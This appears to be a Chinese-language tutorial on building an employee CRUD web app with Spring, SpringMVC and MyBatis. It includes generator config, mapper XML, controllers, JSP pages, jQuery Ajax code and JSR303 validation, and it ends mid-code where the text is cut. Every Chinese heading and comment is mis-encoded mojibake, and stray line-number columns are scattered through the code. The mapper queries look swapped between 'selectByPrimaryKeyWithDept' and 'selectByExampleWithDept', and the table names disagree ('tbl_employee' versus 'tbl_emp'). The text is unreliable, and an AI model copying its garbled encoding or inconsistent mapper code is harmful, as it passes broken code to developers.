Dynamic;\n\nSET FOREIGN_KEY_CHECKS = 1;\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# Mybatiséåå·¥ç¨\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorConfiguration>\n\n    <context id="mybatismysql" targetRuntime="MyBatis3">\n        <commentGenerator>\n            <property name="suppressAllComments" value="true" />\n        </commentGenerator>\n        \x3c!-- éç½®æ°æ®åºè¿æ¥ --\x3e\n        <jdbcConnection driverClass="com.mysql.jdbc.Driver"\n                        connectionURL="jdbc:mysql://localhost:3306/ssm_crud?useSSL=false"\n                        userId="root"\n                        password="123456">\n        </jdbcConnection>\n\n        <javaTypeResolver>\n            <property name="forceBigDecimals" value="false" />\n        </javaTypeResolver>\n\n        \x3c!-- æå®javaBeançæçä½ç½® --\x3e\n        <javaModelGenerator targetPackage="com.pwddd.ssm.bean"\n                            targetProject=".\\src\\main\\java">\n            <property name="enableSubPackages" value="true" />\n            <property name="trimStrings" value="true" />\n        </javaModelGenerator>\n\n        \x3c!--æå®sqlæ å°æä»¶çæçä½ç½® --\x3e\n        <sqlMapGenerator targetPackage="mapper" targetProject=".\\src\\main\\resources">\n            <property name="enableSubPackages" value="true" />\n        </sqlMapGenerator>\n\n        \x3c!-- æå®daoæ¥å£çæçä½ç½®ï¼mapperæ¥å£ --\x3e\n        <javaClientGenerator type="XMLMAPPER"\n                             targetPackage="com.pwddd.ssm.dao" targetProject=".\\src\\main\\java">\n            <property name="enableSubPackages" value="true" />\n        </javaClientGenerator>\n\n\n        \x3c!-- tableæå®æ¯ä¸ªè¡¨ççæç­ç¥ --\x3e\n        <table tableName="tbl_emp" domainObjectName="Employee"></table>\n        <table tableName="tbl_dept" domainObjectName="Department"></table>\n    </context>\n</generatorConfiguration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\nå¯å¨éåå·¥ç¨\n\npublic static void main(String[] args) throws Exception {\n    List<String> warnings = new ArrayList<String>();\n    boolean overwrite = true;\n    File configFile = new File("mbg.xml");\n    ConfigurationParser cp = new ConfigurationParser(warnings);\n    Configuration config = cp.parseConfiguration(configFile);\n    DefaultShellCallback callback = new DefaultShellCallback(overwrite);\n    MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings);\n    myBatisGenerator.generate(null);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# ä¿®æ¹çæçMapper\n\n  <select id="selectByPrimaryKeyWithDept" resultMap="WithDeptResultMap">\n      select\n      <if test="distinct">\n        distinct\n      </if>\n      <include refid="WithDept_Column_List" />\n      from tbl_employee e left join tbl_dept d on e.d_id = d.dept_id\n      <if test="_parameter != null">\n        <include refid="Example_Where_Clause" />\n      </if>\n      <if test="orderByClause != null">\n        order by ${orderByClause}\n      </if>\n  </select>\n\n  <select id="selectByExampleWithDept" resultMap="WithDeptResultMap">\n    select\n    <include refid="WithDept_Column_List" />\n    from tbl_employee e left join tbl_dept d on e.d_id = d.dept_id\n    where emp_id = #{empId,jdbcType=INTEGER}\n\n  </select>\n\n  \x3c!--èªå®ä¹èåæ¥è¯¢--\x3e\n  <sql id="WithDept_Column_List">\n    e.emp_id, e.emp_name, e.gender, e.email, e.dept_id , d.dept_name\n  </sql>\n\n  <resultMap id="WithDeptResultMap" type="com.pwddd.ssm.bean.Employee">\n    <id column="emp_id" jdbcType="INTEGER" property="empId" />\n    <result column="emp_name" jdbcType="VARCHAR" property="empName" />\n    <result column="gender" jdbcType="CHAR" property="gender" />\n    <result column="email" jdbcType="VARCHAR" property="email" />\n    <association property="department" javaType="com.pwddd.ssm.bean.Department">\n      <result column="dept_id" property="deptId" />\n      <result column="dept_name" property="deptName" />\n    </association>\n  </resultMap> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# Springæ³¨å¥ æµè¯Daoå±\n\nä¸ºäºæ¹éæå¥æ°æ®åºï¼éè¦éç½®ä¸ä¸ªæ¹éæä½çSQLsession\n\n<bean class="org.mybatis.spring.SqlSessionTemplate" id="sqlSession">\n    <constructor-arg index="0" ref="sqlSessionFactory" />\n    <constructor-arg index="1" value="BATCH" />\n</bean>\n\n\n1\n2\n3\n4\n\n\næ¹éæå¥æ°æ®\n\n    @Test\n    public void testEmp(){\n        EmployeeMapper mapper = sqlSession.getMapper(EmployeeMapper.class);\n\n        for (int i = 0 ; i<=10000;i++){\n            mapper.insertSelective(new Employee(\n                UUID.randomUUID().toString().substring(0,5),\n                "M",\n                UUID.randomUUID().toString().substring(0,5)+"@qq.com",\n                1));\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ°æ®å¤ç\n\n\n# æ¥è¯¢åå·¥åè¡¨\n\n 1. ç¼åControllerï¼æ¥æ¶è¯·æ±\n\n@GetMapping("/emps")\npublic String getEmps(@RequestParam(value = "pn",defaultValue = "1")Integer pn,\n                      @RequestParam(value = "num",defaultValue = "5")Integer num,\n                      Model model){\n    // è®¾ç½®åé¡µ\n    PageHelper.startPage(pn,num);\n    List<Employee> employees = employeeService.getEmps();\n    PageInfo pageInfo = new PageInfo(employees,5);\n    model.addAttribute("pageInfo",pageInfo);\n    return "list";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. éç½®åé¡µæä»¶\n\n<plugins>\n    <plugin interceptor="com.github.pagehelper.PageInterceptor" />\n</plugins>\n\n\n1\n2\n3\n\n 3. æµè¯æ¥è¯¢\n\nimport com.github.pagehelper.PageInfo;\nimport com.pwddd.ssm.bean.Employee;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.mock.web.MockHttpServletRequest;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\nimport org.springframework.test.context.web.WebAppConfiguration;\nimport org.springframework.test.web.servlet.MockMvc;\nimport org.springframework.test.web.servlet.MockMvcBuilder;\nimport org.springframework.test.web.servlet.MvcResult;\nimport org.springframework.test.web.servlet.request.MockMvcRequestBuilders;\nimport org.springframework.test.web.servlet.setup.MockMvcBuilders;\nimport org.springframework.web.context.WebApplicationContext;\n\nimport java.util.List;\n\n@WebAppConfiguration\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(locations = {"classpath:applicationContext.xml","classpath:spring-mvc.xml"})\npublic class TestMVC {\n\n    @Autowired\n    private WebApplicationContext applicationContext;\n\n    private MockMvc mockMvc;\n\n    @Before\n    public void init(){\n        mockMvc = MockMvcBuilders.webAppContextSetup(applicationContext).build();\n    }\n\n    @Test\n    public void testSelectAllEmps() throws Exception {\n        MvcResult mvcResult = mockMvc.perform(MockMvcRequestBuilders.get("/emps")\n                .param("pn", "1").param("num", "20")).andReturn();\n        MockHttpServletRequest request = mvcResult.getRequest();\n        PageInfo pageInfo = (PageInfo) request.getAttribute("pageInfo");\n        System.out.println(pageInfo);\n        List<Employee> list = pageInfo.getList();\n        for (Employee employee :\n        list) {\n            System.out.println(employee.getEmpId());\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 4. ç¼åé¡µé¢,Index.jspè®¾ç½®è·³è½¬æä»¬çè¯·æ±å°åã\n\n\n<%@ page language="java" contentType="text/html; charset=UTF-8"\n         pageEncoding="UTF-8"%>\n<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>\n<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<html>\n<head>\n    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">\n    <title>åå·¥åè¡¨</title>\n<%\n    pageContext.setAttribute("APP_PATH", request.getContextPath());\n%>\n    \x3c!-- webè·¯å¾ï¼\nä¸ä»¥/å¼å§çç¸å¯¹è·¯å¾ï¼æ¾èµæºï¼ä»¥å½åèµæºçè·¯å¾ä¸ºåºåï¼ç»å¸¸å®¹æåºé®é¢ã\nä»¥/å¼å§çç¸å¯¹è·¯å¾ï¼æ¾èµæºï¼ä»¥æå¡å¨çè·¯å¾ä¸ºæ å(http://localhost:3306)ï¼éè¦å ä¸é¡¹ç®å\n\t\thttp://localhost:3306/crud\n --\x3e\n    <script type="text/javascript"\n            src="${APP_PATH}/static/js/jquery-1.12.4.min.js"><\/script>\n    <link\n            href="${APP_PATH}/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"\n            rel="stylesheet">\n    <script\n            src="${APP_PATH}/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"><\/script>\n</head>\n<body>\n\x3c!-- æ­å»ºæ¾ç¤ºé¡µé¢ --\x3e\n<div class="container">\n    \x3c!-- æ é¢ --\x3e\n    <div class="row">\n        <div class="col-md-12">\n            <h1>SSM-CRUD</h1>\n        </div>\n    </div>\n    \x3c!-- æé® --\x3e\n    <div class="row">\n        <div class="col-md-4 col-md-offset-8">\n            <button class="btn btn-primary">æ°å¢</button>\n            <button class="btn btn-danger">å é¤</button>\n        </div>\n    </div>\n    \x3c!-- æ¾ç¤ºè¡¨æ ¼æ°æ® --\x3e\n    <div class="row">\n        <div class="col-md-12">\n            <table class="table table-hover">\n                <tr>\n                    <th>#</th>\n                    <th>empName</th>\n                    <th>gender</th>\n                    <th>email</th>\n                    <th>deptName</th>\n                    <th>æä½</th>\n                </tr>\n                <c:forEach items="${pageInfo.list }" var="emp">\n                    <tr>\n                        <th>${emp.empId }</th>\n                        <th>${emp.empName }</th>\n                        <th>${emp.gender=="M"?"ç·":"å¥³" }</th>\n                        <th>${emp.email }</th>\n                        <th>${emp.department.deptName }</th>\n                        <th>\n                            <button class="btn btn-primary btn-sm">\n                                <span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>\n                                ç¼è¾\n                            </button>\n                            <button class="btn btn-danger btn-sm">\n                                <span class="glyphicon glyphicon-trash" aria-hidden="true"></span>\n                                å é¤\n                            </button>\n                        </th>\n                    </tr>\n                </c:forEach>\n            </table>\n        </div>\n    </div>\n\n    \x3c!-- æ¾ç¤ºåé¡µä¿¡æ¯ --\x3e\n    <div class="row">\n        \x3c!--åé¡µæå­ä¿¡æ¯  --\x3e\n        <div class="col-md-6">å½å ${pageInfo.pageNum }é¡µ,æ»${pageInfo.pages }\n            é¡µ,æ» ${pageInfo.total } æ¡è®°å½</div>\n        \x3c!-- åé¡µæ¡ä¿¡æ¯ --\x3e\n        <div class="col-md-6">\n            <nav aria-label="Page navigation">\n                <ul class="pagination">\n                    <li><a href="${APP_PATH }/emps?pn=1">é¦é¡µ</a></li>\n                    <c:if test="${pageInfo.hasPreviousPage }">\n                        <li><a href="${APP_PATH }/emps?pn=${pageInfo.pageNum-1}"\n                               aria-label="Previous"> <span aria-hidden="true">&laquo;</span>\n                        </a></li>\n                    </c:if>\n\n\n                    <c:forEach items="${pageInfo.navigatepageNums }" var="page_Num">\n                        <c:if test="${page_Num == pageInfo.pageNum }">\n                            <li class="active"><a href="#">${page_Num }</a></li>\n                        </c:if>\n                        <c:if test="${page_Num != pageInfo.pageNum }">\n                            <li><a href="${APP_PATH }/emps?pn=${page_Num }">${page_Num }</a></li>\n                        </c:if>\n\n                    </c:forEach>\n                    <c:if test="${pageInfo.hasNextPage }">\n                        <li><a href="${APP_PATH }/emps?pn=${pageInfo.pageNum+1 }"\n                               aria-label="Next"> <span aria-hidden="true">&raquo;</span>\n                        </a></li>\n                    </c:if>\n                    <li><a href="${APP_PATH }/emps?pn=${pageInfo.pages}">æ«é¡µ</a></li>\n                </ul>\n            </nav>\n        </div>\n    </div>\n\n</div>\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n\n 5. æ³¨æï¼ideaèªå¨çæçweb-appçæ¬ä¸º2.3ï¼è¯¥çæ¬çweb-appå¹¶ä¸æ¯æELè¡¨è¾¾å¼ï¼å æ­¤æä»¬ç¼åçjspé¡µé¢ä¼åºéãéè¦å°web.xmlçææ¡£çº¦æä¿®æ¹ä¸ºå¦ä¸çåå®¹ï¼\n\n<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee\n         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"\n         version="3.1">\n\n\n1\n2\n3\n4\n5\n\n\n# ä½¿ç¨Ajaxè¯·æ±\n\n//1ãé¡µé¢å è½½å®æä»¥åï¼ç´æ¥å»åéajaxè¯·æ±,è¦å°åé¡µæ°æ®\n$(function(){\n    //å»é¦é¡µ\n    to_page(1);\n});\nfunction to_page(pn){\n    $.ajax({\n        url:"${APP_PATH}/emps",\n        data:"pn="+pn,\n        type:"GET",\n        success:function(result){\n            //console.log(result);\n            //1ãè§£æå¹¶æ¾ç¤ºåå·¥æ°æ®\n            build_emps_table(result);\n            //2ãè§£æå¹¶æ¾ç¤ºåé¡µä¿¡æ¯\n            build_page_info(result);\n            //3ãè§£ææ¾ç¤ºåé¡µæ¡æ°æ®\n            build_page_nav(result);\n        }\n    });\n}\n\nfunction build_emps_table(result){\n    //æ¸ç©ºtableè¡¨æ ¼\n    $("#emps_table tbody").empty();\n    var emps = result.extend.pageInfo.list;\n    $.each(emps,function(index,item){\n        var checkBoxTd = $("<td><input type=\'checkbox\' class=\'check_item\'/></td>");\n        var empIdTd = $("<td></td>").append(item.empId);\n        var empNameTd = $("<td></td>").append(item.empName);\n        var genderTd = $("<td></td>").append(item.gender==\'M\'?"ç·":"å¥³");\n        var emailTd = $("<td></td>").append(item.email);\n        var deptNameTd = $("<td></td>").append(item.department.deptName);\n        /**\n             <button class="">\n             <span class="" aria-hidden="true"></span>\n             ç¼è¾\n             </button>\n             */\n        var editBtn = $("<button></button>").addClass("btn btn-primary btn-sm edit_btn")\n        .append($("<span></span>").addClass("glyphicon glyphicon-pencil")).append("ç¼è¾");\n        //ä¸ºç¼è¾æé®æ·»å ä¸ä¸ªèªå®ä¹çå±æ§ï¼æ¥è¡¨ç¤ºå½ååå·¥id\n        editBtn.attr("edit-id",item.empId);\n        var delBtn =  $("<button></button>").addClass("btn btn-danger btn-sm delete_btn")\n        .append($("<span></span>").addClass("glyphicon glyphicon-trash")).append("å é¤");\n        //ä¸ºå é¤æé®æ·»å ä¸ä¸ªèªå®ä¹çå±æ§æ¥è¡¨ç¤ºå½åå é¤çåå·¥id\n        delBtn.attr("del-id",item.empId);\n        var btnTd = $("<td></td>").append(editBtn).append(" ").append(delBtn);\n        //var delBtn =\n        //appendæ¹æ³æ§è¡å®æä»¥åè¿æ¯è¿ååæ¥çåç´ \n        $("<tr></tr>").append(checkBoxTd)\n            .append(empIdTd)\n            .append(empNameTd)\n            .append(genderTd)\n            .append(emailTd)\n            .append(deptNameTd)\n            .append(btnTd)\n            .appendTo("#emps_table tbody");\n    });\n}\n//è§£ææ¾ç¤ºåé¡µä¿¡æ¯\nfunction build_page_info(result){\n    $("#page_info_area").empty();\n    $("#page_info_area").append("å½å"+result.extend.pageInfo.pageNum+"é¡µ,æ»"+\n                                result.extend.pageInfo.pages+"é¡µ,æ»"+\n                                result.extend.pageInfo.total+"æ¡è®°å½");\n    totalRecord = result.extend.pageInfo.total;\n    currentPage = result.extend.pageInfo.pageNum;\n}\n//è§£ææ¾ç¤ºåé¡µæ¡ï¼ç¹å»åé¡µè¦è½å»ä¸ä¸é¡µ....\nfunction build_page_nav(result){\n    //page_nav_area\n    $("#page_nav_area").empty();\n    var ul = $("<ul></ul>").addClass("pagination");\n\n    //æå»ºåç´ \n    var firstPageLi = $("<li></li>").append($("<a></a>").append("é¦é¡µ").attr("href","#"));\n    var prePageLi = $("<li></li>").append($("<a></a>").append("&laquo;"));\n    if(result.extend.pageInfo.hasPreviousPage == false){\n        firstPageLi.addClass("disabled");\n        prePageLi.addClass("disabled");\n    }else{\n        //ä¸ºåç´ æ·»å ç¹å»ç¿»é¡µçäºä»¶\n        firstPageLi.click(function(){\n            to_page(1);\n        });\n        prePageLi.click(function(){\n            to_page(result.extend.pageInfo.pageNum -1);\n        });\n    }\n\n\n\n    var nextPageLi = $("<li></li>").append($("<a></a>").append("&raquo;"));\n    var lastPageLi = $("<li></li>").append($("<a></a>").append("æ«é¡µ").attr("href","#"));\n    if(result.extend.pageInfo.hasNextPage == false){\n        nextPageLi.addClass("disabled");\n        lastPageLi.addClass("disabled");\n    }else{\n        nextPageLi.click(function(){\n            to_page(result.extend.pageInfo.pageNum +1);\n        });\n        lastPageLi.click(function(){\n            to_page(result.extend.pageInfo.pages);\n        });\n    }\n\n\n\n    //æ·»å é¦é¡µååä¸é¡µ çæç¤º\n    ul.append(firstPageLi).append(prePageLi);\n    //1,2ï¼3éåç»ulä¸­æ·»å é¡µç æç¤º\n    $.each(result.extend.pageInfo.navigatepageNums,function(index,item){\n\n        var numLi = $("<li></li>").append($("<a></a>").append(item));\n        if(result.extend.pageInfo.pageNum == item){\n            numLi.addClass("active");\n        }\n        numLi.click(function(){\n            to_page(item);\n        });\n        ul.append(numLi);\n    });\n    //æ·»å ä¸ä¸é¡µåæ«é¡µ çæç¤º\n    ul.append(nextPageLi).append(lastPageLi);\n\n    //æulå å¥å°nav\n    var navEle = $("<nav></nav>").append(ul);\n    navEle.appendTo("#page_nav_area");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n\n\nåå°ååºjsonæ°æ®ï¼éè¦å¼å¥jacksonï¼å¹¶è®¾ç½®@ResponseBodyæ³¨è§£\n\n\n# æ·»å é¡µé¢æ¾ç¤ºé¨é¨ä¸æåè¡¨\n\n 1. æ·»å é¨é¨Controller\n\n@Controller\npublic class DeptController {\n\n    @Autowired\n    private DeptSerrvice deptSerrvice;\n\n    @ResponseBody\n    @RequestMapping("/depts")\n    public Msg getAllDepts(){\n        List<Department> depts  = deptSerrvice.getAllDepts();\n        return Msg.success().add("depts",depts);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. å½ç¨æ·ç¹å»ç¼è¾æé®æ¶ï¼åéAjaxè¯·æ±ï¼è·åå°é¨é¨ä¿¡æ¯\n\n//æ¥åºææçé¨é¨ä¿¡æ¯å¹¶æ¾ç¤ºå¨ä¸æåè¡¨ä¸­\nfunction getDepts(ele){\n    //æ¸ç©ºä¹åä¸æåè¡¨çå¼\n    $(ele).empty();\n    $.ajax({\n        url:"${APP_PATH}/depts",\n        type:"GET",\n        success:function(result){\n            //{"code":100,"msg":"å¤çæåï¼",\n            //"extend":{"depts":[{"deptId":1,"deptName":"å¼åé¨"},{"deptId":2,"deptName":"æµè¯é¨"}]}}\n            //console.log(result);\n            //æ¾ç¤ºé¨é¨ä¿¡æ¯å¨ä¸æåè¡¨ä¸­\n            //$("#empAddModal select").append("")\n            $.each(result.extend.depts,function(){\n                var optionEle = $("<option></option>").append(this.deptName).attr("value",this.deptId);\n                optionEle.appendTo(ele);\n            });\n        }\n    });\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# æ£æµç¨æ·åæ¯å¦å¯ç¨\n\n 1. ç¼åå¯¹åºçè¯·æ±å¤çæ¹æ³\n\n@GetMapping("/checkuser")\n@ResponseBody\npublic Msg checkUser(@RequestParam("empName")String empName){\n    boolean result = employeeService.checkUserName(empName);\n    if (result){\n        return Msg.success();\n    }else {\n        return Msg.fail().add("va_msg","ç¨æ·åä¸å¯ç¨ï¼");\n    }\n}\n\npublic boolean checkUserName(String empName) {\n    EmployeeExample employeeExample = new EmployeeExample();\n    EmployeeExample.Criteria criteria = employeeExample.createCriteria();\n    criteria.andEmpNameEqualTo(empName);\n    long empsCount = employeeMapper.countByExample(employeeExample);\n    if (empsCount == 0){\n        return true;\n    }else{\n        return false;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. åç«¯åèµ·Ajaxè¯·æ±\n\n//æ ¡éªç¨æ·åæ¯å¦å¯ç¨\n$("#empName_add_input").change(function(){\n    //åéajaxè¯·æ±æ ¡éªç¨æ·åæ¯å¦å¯ç¨\n    var empName = this.value;\n    $.ajax({\n        url:"${APP_PATH}/checkuser",\n        data:"empName="+empName,\n        type:"GET",\n        success:function(result){\n            if(result.code==100){\n                show_validate_msg("#empName_add_input","success","ç¨æ·åå¯ç¨");\n                $("#emp_save_btn").attr("ajax-va","success");\n            }else{\n                show_validate_msg("#empName_add_input","error",result.extend.va_msg);\n                $("#emp_save_btn").attr("ajax-va","error");\n            }\n        }\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# ä¿å­ç¨æ·ä¿¡æ¯\n\n 1. ç¼åå¤çæ¥åä¿å­æ°æ®çæ¹æ³\n    \n    /**\n         * åå·¥ä¿å­\n         * 1ãæ¯æJSR303æ ¡éª\n         * 2ãå¯¼å¥Hibernate-Validator\n         *\n         *\n         * @return\n         */\n    @RequestMapping(value="/emp",method=RequestMethod.POST)\n    @ResponseBody\n    public Msg saveEmp(@Valid Employee employee, BindingResult result){\n        if(result.hasErrors()){\n            //æ ¡éªå¤±è´¥ï¼åºè¯¥è¿åå¤±è´¥ï¼å¨æ¨¡ææ¡ä¸­æ¾ç¤ºæ ¡éªå¤±è´¥çéè¯¯ä¿¡æ¯\n            Map<String, Object> map = new HashMap<>();\n            List<FieldError> errors = result.getFieldErrors();\n            for (FieldError fieldError : errors) {\n                System.out.println("éè¯¯çå­æ®µåï¼"+fieldError.getField());\n                System.out.println("éè¯¯ä¿¡æ¯ï¼"+fieldError.getDefaultMessage());\n                map.put(fieldError.getField(), fieldError.getDefaultMessage());\n            }\n            return Msg.fail().add("errorFields", map);\n        }else{\n            employeeService.addUser(employee);\n            return Msg.success();\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    \n\n 2. è®¾ç½®åç«¯JSR303æ ¡éª\n    \n    package com.pwddd.ssm.bean;\n    \n    import javax.validation.constraints.Pattern;\n    \n    \n    \n    public class Employee {\n        private Integer empId;\n    \n        @Pattern(regexp="(^[a-zA-Z0-9_-]{6,16}$)|(^[\\u2E80-\\u9FFF]{2,5})"\n                 ,message="ç¨æ·åå¿é¡»æ¯2-5ä½ä¸­ææè6-16ä½è±æåæ°å­çç»å")\n        private String empName;\n    \n        private String gender;\n    \n        //@Email\n        @Pattern(regexp="^([a-z0-9_\\\\.-]+)@([\\\\da-z\\\\.-]+)\\\\.([a-z\\\\.]{2,6})$",\n                 message="é®ç®±æ ¼å¼ä¸æ­£ç¡®")\n        private String email;\n    \n        private Integer dId;\n    \n        //å¸ææ¥è¯¢åå·¥çåæ¶é¨é¨ä¿¡æ¯ä¹æ¯æ¥è¯¢å¥½ç\n        private Department department;\n    \n    \n        public Employee(String empName, String gender, String email, Integer dId) {\n            this.empName = empName;\n            this.gender = gender;\n            this.email = email;\n            this.dId = dId;\n        }\n    \n        @Override\n        public String toString() {\n            return "Employee [empId=" + empId + ", empName=" + empName\n                + ", gender=" + gender + ", email=" + email + ", dId=" + dId\n                + "]";\n        }\n    \n        public Employee() {\n            super();\n        }\n    \n        public Employee(Integer empId, String empName, String gender, String email,\n                        Integer dId) {\n            super();\n            this.empId = empId;\n            this.empName = empName;\n            this.gender = gender;\n            this.email = email;\n            this.dId = dId;\n        }\n    \n        public Department getDepartment() {\n            return department;\n        }\n    \n        public void setDepartment(Department department) {\n            this.department = department;\n        }\n    \n        public Integer getEmpId() {\n            return empId;\n        }\n    \n        public void setEmpId(Integer empId) {\n            this.empId = empId;\n        }\n    \n        public String getEmpName() {\n            return empName;\n        }\n    \n        public void setEmpName(String empName) {\n            this.empName = empName == null ? null : empName.trim();\n        }\n    \n        public String getGender() {\n            return gender;\n        }\n    \n        public void setGender(String gender) {\n            this.gender = gender == null ? null : gender.trim();\n        }\n    \n        public String getEmail() {\n            return email;\n        }\n    \n        public void setEmail(String email) {\n            this.email = email == null ? null : email.trim();\n        }\n    \n        public Integer getdId() {\n            return dId;\n        }\n    \n        public void setdId(Integer dId) {\n            this.dId = dId;\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    87\n    88\n    89\n    90\n    91\n    92\n    93\n    94\n    95\n    96\n    97\n    98\n    99\n    100\n    101\n    102\n    103\n    \n\n 3. åç«¯Ajaxå°è¡¨åä¿¡æ¯åéç»æå¡å¨\n    \n    //ç¹å»ä¿å­ï¼ä¿å­åå·¥ã\n    $("#emp_save_btn").click(function(){\n        //1ãæ¨¡ææ¡ä¸­å¡«åçè¡¨åæ°æ®æäº¤ç»æå¡å¨è¿è¡ä¿å­\n        //1ãåå¯¹è¦æäº¤ç»æå¡å¨çæ°æ®è¿è¡æ ¡éª\n        if(!validate_add_form()){\n            return false;\n        };\n        //1ãå¤æ­ä¹åçajaxç¨æ·åæ ¡éªæ¯å¦æåãå¦ææåã\n        if($(this).attr("ajax-va")=="error"){\n            return false;\n        }\n    \n        //2ãåéajaxè¯·æ±ä¿å­åå·¥\n        $.ajax({\n            url:"${APP_PATH}/emp",\n            type:"POST",\n            data:$("#empAddModal form").serialize(),\n            success:function(result){\n                //alert(result.msg);\n                if(result.code == 100){\n                    //åå·¥ä¿å­æåï¼\n                    //1ãå³é­æ¨¡ææ¡\n                    $("#empAddModal").modal(\'hide\');\n    \n                    //2ãæ¥å°æåä¸é¡µï¼æ¾ç¤ºåæä¿å­çæ°æ®\n                    //åéajaxè¯·æ±æ¾ç¤ºæåä¸é¡µæ°æ®å³å¯\n                    to_page(totalRecord);\n                }else{\n                    //æ¾ç¤ºå¤±è´¥ä¿¡æ¯\n                    //console.log(result);\n                    //æåªä¸ªå­æ®µçéè¯¯ä¿¡æ¯å°±æ¾ç¤ºåªä¸ªå­æ®µçï¼\n                    if(undefined != result.extend.errorFields.email){\n                        //æ¾ç¤ºé®ç®±éè¯¯ä¿¡æ¯\n                        show_validate_msg("#email_add_input", "error", result.extend.errorFields.email);\n                    }\n                    if(undefined != result.extend.errorFields.empName){\n                        //æ¾ç¤ºåå·¥åå­çéè¯¯ä¿¡æ¯\n                        show_validate_msg("#empName_add_input", "error", result.extend.errorFields.empName);\n        